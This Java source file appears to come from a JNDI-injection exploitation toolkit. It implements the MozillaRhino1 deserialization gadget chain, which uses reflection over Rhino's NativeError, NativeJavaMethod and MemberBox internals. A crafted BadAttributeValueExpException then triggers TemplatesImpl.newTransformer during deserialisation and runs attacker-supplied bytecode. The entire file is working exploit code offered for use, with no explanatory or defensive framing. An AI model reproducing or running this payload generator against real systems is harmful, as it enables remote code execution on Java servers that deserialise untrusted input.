package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.annotation.Authors;
import com.nu1r.jndi.gadgets.annotation.Dependencies;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.nu1r.jndi.gadgets.utils.JavaVersion;
import com.nu1r.jndi.gadgets.utils.Reflections;
import com.nu1r.jndi.gadgets.utils.Serializer;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.mozilla.javascript.*;


import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Arrays;

/*
    by @matthias_kaiser
*/

@SuppressWarnings({"unused"})
@Dependencies({"rhino:js:1.7R2"})
@Authors({Authors.MATTHIASKAISER})
public class MozillaRhino1 implements ObjectPayload<Object>{
    public Object getObject(PayloadType type, String... param) throws Exception {
        Class       nativeErrorClass       = Class.forName("org.mozilla.javascript.NativeError");
        Constructor nativeErrorConstructor = nativeErrorClass.getDeclaredConstructor();
        Reflections.setAccessible(nativeErrorConstructor);
        IdScriptableObject idScriptableObject = (IdScriptableObject) nativeErrorConstructor.newInstance();

        Context context = Context.enter();

        NativeObject scriptableObject = (NativeObject) context.initStandardObjects();

        Method           enterMethod = Context.class.getDeclaredMethod("enter");
        NativeJavaMethod method      = new NativeJavaMethod(enterMethod, "name");
        idScriptableObject.setGetterOrSetter("name", 0, method, false);

        Method           newTransformer   = TemplatesImpl.class.getDeclaredMethod("newTransformer");
        NativeJavaMethod nativeJavaMethod = new NativeJavaMethod(newTransformer, "message");
        idScriptableObject.setGetterOrSetter("message", 0, nativeJavaMethod, false);

        Method getSlot = ScriptableObject.class.getDeclaredMethod("getSlot", String.class, int.class, int.class);
        Reflections.setAccessible(getSlot);
        Object slot   = getSlot.invoke(idScriptableObject, "name", 0, 1);
        Field  getter = slot.getClass().getDeclaredField("getter");
        Reflections.setAccessible(getter);

        Class       memberboxClass            = Class.forName("org.mozilla.javascript.MemberBox");
        Constructor memberboxClassConstructor = memberboxClass.getDeclaredConstructor(Method.class);
        Reflections.setAccessible(memberboxClassConstructor);
        Object memberboxes = memberboxClassConstructor.newInstance(enterMethod);
        getter.set(slot, memberboxes);

        NativeJavaObject nativeObject = new NativeJavaObject(scriptableObject, Gadgets.createTemplatesImpl(type,param), TemplatesImpl.class);
        idScriptableObject.setPrototype(nativeObject);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field                         valField                      = badAttributeValueExpException.getClass().getDeclaredField("val");
        Reflections.setAccessible(valField);
        valField.set(badAttributeValueExpException, idScriptableObject);
        return badAttributeValueExpException;
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }
}
